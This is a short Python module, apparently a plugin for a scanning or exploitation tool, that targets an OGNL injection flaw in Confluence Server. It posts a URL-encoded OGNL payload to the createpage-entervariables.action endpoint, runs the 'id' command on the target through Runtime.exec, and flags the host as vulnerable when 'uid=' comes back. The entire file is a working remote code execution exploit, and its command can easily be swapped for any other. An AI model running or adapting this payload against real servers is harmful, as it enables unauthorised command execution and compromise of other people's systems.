import requests
from core.printmodels import *

class Confluence_OGNL_RCE:
    def __init__(self):
        self.name = "Confluence OGNL RCE"
        self.description = "Confluence Server OGNL Injection RCE"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            endpoint = f"{site}/pages/createpage-entervariables.action"
            payload = "queryString=\\u0027%2b%7b%23a%3d%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7d%2b%27"
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            
            response = requests.post(endpoint, data=payload, headers=headers, verify=False, timeout=10)
            if "uid=" in response.text:
                return PrintSuccess(f"[Confluence] Vulnerable to OGNL RCE!")
            return PrintFailed("[Confluence] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Confluence] Error: {str(e)}")
